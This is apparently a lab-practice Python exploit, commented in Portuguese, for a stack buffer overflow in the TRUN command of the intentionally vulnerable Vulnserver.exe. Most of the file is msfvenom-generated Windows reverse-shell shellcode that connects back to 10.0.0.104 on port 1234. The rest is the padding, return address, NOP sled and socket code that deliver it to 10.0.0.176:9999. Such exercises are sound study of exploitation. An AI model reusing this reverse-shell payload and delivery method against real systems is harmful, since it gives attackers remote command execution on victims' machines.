#!/usr/bin/python3

import socket


# ESTE EXPLOIT EXPLORA A VULNERABILIDAE DE BUFFER OVERFLOW
# NO SOFTWARE VULNERAVEL VULNSERVER.EXE
# O PAYLOAD ABAIXO FOI FEITO COM O MSFVENOM E ABRE UMA SHELL NO ALVO
# O PONTO DE ENTRADA PARA A SOBRESCRITA DE DADOS NA MEMORIA
#FOI O COMANDO 'TRUN'.

#SHELLCODE
#msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.104 LPORT=1234 EXITFUNC=thread -b "\x00" -f python
# SHELLCODE sem o uso do meterpreter, ganhamos a shell abrindo uma porta com o netcat

buf =  b""
buf += b"\xb8\x60\x06\x3b\xe1\xda\xd2\xd9\x74\x24\xf4\x5b"
buf += b"\x31\xc9\xb1\x52\x83\xeb\xfc\x31\x43\x0e\x03\x23"
buf += b"\x08\xd9\x14\x5f\xfc\x9f\xd7\x9f\xfd\xff\x5e\x7a"
buf += b"\xcc\x3f\x04\x0f\x7f\xf0\x4e\x5d\x8c\x7b\x02\x75"
buf += b"\x07\x09\x8b\x7a\xa0\xa4\xed\xb5\x31\x94\xce\xd4"
buf += b"\xb1\xe7\x02\x36\x8b\x27\x57\x37\xcc\x5a\x9a\x65"
buf += b"\x85\x11\x09\x99\xa2\x6c\x92\x12\xf8\x61\x92\xc7"
buf += b"\x49\x83\xb3\x56\xc1\xda\x13\x59\x06\x57\x1a\x41"
buf += b"\x4b\x52\xd4\xfa\xbf\x28\xe7\x2a\x8e\xd1\x44\x13"
buf += b"\x3e\x20\x94\x54\xf9\xdb\xe3\xac\xf9\x66\xf4\x6b"
buf += b"\x83\xbc\x71\x6f\x23\x36\x21\x4b\xd5\x9b\xb4\x18"
buf += b"\xd9\x50\xb2\x46\xfe\x67\x17\xfd\xfa\xec\x96\xd1"
buf += b"\x8a\xb7\xbc\xf5\xd7\x6c\xdc\xac\xbd\xc3\xe1\xae"
buf += b"\x1d\xbb\x47\xa5\xb0\xa8\xf5\xe4\xdc\x1d\x34\x16"
buf += b"\x1d\x0a\x4f\x65\x2f\x95\xfb\xe1\x03\x5e\x22\xf6"
buf += b"\x64\x75\x92\x68\x9b\x76\xe3\xa1\x58\x22\xb3\xd9"
buf += b"\x49\x4b\x58\x19\x75\x9e\xcf\x49\xd9\x71\xb0\x39"
buf += b"\x99\x21\x58\x53\x16\x1d\x78\x5c\xfc\x36\x13\xa7"
buf += b"\x97\x32\xe4\xa7\x0f\x2b\xe6\xa7\xcb\x79\x6f\x41"
buf += b"\xb9\x6d\x26\xda\x56\x17\x63\x90\xc7\xd8\xb9\xdd"
buf += b"\xc8\x53\x4e\x22\x86\x93\x3b\x30\x7f\x54\x76\x6a"
buf += b"\xd6\x6b\xac\x02\xb4\xfe\x2b\xd2\xb3\xe2\xe3\x85"
buf += b"\x94\xd5\xfd\x43\x09\x4f\x54\x71\xd0\x09\x9f\x31"
buf += b"\x0f\xea\x1e\xb8\xc2\x56\x05\xaa\x1a\x56\x01\x9e"
buf += b"\xf2\x01\xdf\x48\xb5\xfb\x91\x22\x6f\x57\x78\xa2"
buf += b"\xf6\x9b\xbb\xb4\xf6\xf1\x4d\x58\x46\xac\x0b\x67"
buf += b"\x67\x38\x9c\x10\x95\xd8\x63\xcb\x1d\xf8\x81\xd9"
buf += b"\x6b\x91\x1f\x88\xd1\xfc\x9f\x67\x15\xf9\x23\x8d"
buf += b"\xe6\xfe\x3c\xe4\xe3\xbb\xfa\x15\x9e\xd4\x6e\x19"
buf += b"\x0d\xd4\xba"

#BAD CHARS: \x00

exploit = b"A" * 2003 + b"\xc7\x11\x50\x62" + b"\x90" * 20 + buf

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

connect = sock.connect(("10.0.0.176", 9999))
sock.recv(1024)
sock.send((b"TRUN /.:/"+exploit))
